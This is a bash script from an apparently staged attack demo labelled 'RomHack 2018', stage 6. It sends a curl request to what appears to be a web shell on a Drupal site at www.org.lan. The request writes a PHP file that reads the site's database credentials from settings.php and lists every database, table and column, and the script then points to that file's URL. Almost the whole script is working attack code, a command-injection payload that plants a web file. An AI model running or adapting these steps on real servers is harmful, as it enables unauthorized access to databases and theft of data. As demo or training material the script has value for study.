#!/bin/bash
echo "~~ RomHack 2018 ~~"
echo 
echo "STAGE6"
echo "Enumerate DB and Tables of the remote DB"
echo "Write a PHP file enumerateDB.php on the remote server"
echo
echo "enumerateDB.php content:"
cat <<EOF
echo "<?php 
        require_once("settings.php");
        \$conn =  mysqli_connect(\$databases["default"]["default"]["host"], \$databases["default"]["default"]["username"], \$databases["default"]["default"]["password"]);
	\$query = mysqli_query(\$conn, "show databases");
	while(\$row = mysqli_fetch_assoc(\$query)){
		echo "<hr>Database =" .\$row["Database"]."<br>";
		mysqli_select_db(\$conn,\$row["Database]);
		\$tables=mysqli_query(\$conn, "show tables");
		while(\$rowtable = mysqli_fetch_assoc(\$tables)){
			echo "Table: ".\$rowtable["Tables_in_".\$row["Database"]]."<br>";
			\$columns=mysqli_query(\$conn, "show columns from ".\$row["Database"].".".\$rowtable["Tables_in_".\$row["Database"]]);
			while(\$rowcolumns = mysqli_fetch_assoc(\$columns)){
				echo "---".\$rowcolumns["Field"]." (".\$rowcolumns["Type"].")<br />";
			}
		}
	} 
?>" > enumerateDB.php
EOF
echo 
read pippo
echo "------"
curl -v 'http://www.org.lan/sites/default/drupal.settin.php' \
	--compressed \
	-H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0' \
	-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
	-H 'Accept-Language: en-GB,en;q=0.5' \
	-H 'Connection: keep-alive' \
	-H 'Content-Type: application/x-www-form-urlencoded' \
	-H 'Upgrade-Insecure-Requests: 1' \
	-H 'Pragma: no-cache' \
	-H 'Cache-Control: no-cache' \
	--data 'c=echo "<?php require_once(\"settings.php\");\$conn =  mysqli_connect(\$databases[\"default\"][\"default\"][\"host\"], \$databases[\"default\"][\"default\"][\"username\"], \$databases[\"default\"][\"default\"][\"password\"]);\$query = mysqli_query(\$conn, \"show databases\"); while(\$row = mysqli_fetch_assoc(\$query)){ echo \"<hr>Database =\" .\$row[\"Database\"].\"<br>\";mysqli_select_db(\$conn,\$row[\"Database\"]);\$tables=mysqli_query(\$conn, \"show tables\");while(\$rowtable = mysqli_fetch_assoc(\$tables)){echo \"Table: \".\$rowtable[\"Tables_in_\".\$row[\"Database\"]].\"<br>\";\$columns=mysqli_query(\$conn, \"show columns from \".\$row[\"Database\"].\".\".\$rowtable[\"Tables_in_\".\$row[\"Database\"]]);while(\$rowcolumns = mysqli_fetch_assoc(\$columns)){echo \"---\".\$rowcolumns[\"Field\"].\" (\".\$rowcolumns[\"Type\"].\")<br />\";}}} ?>" > enumerateDB.php'
echo "------"
echo
echo "Access: http://www.org.lan/sites/default/enumerateDB.php"
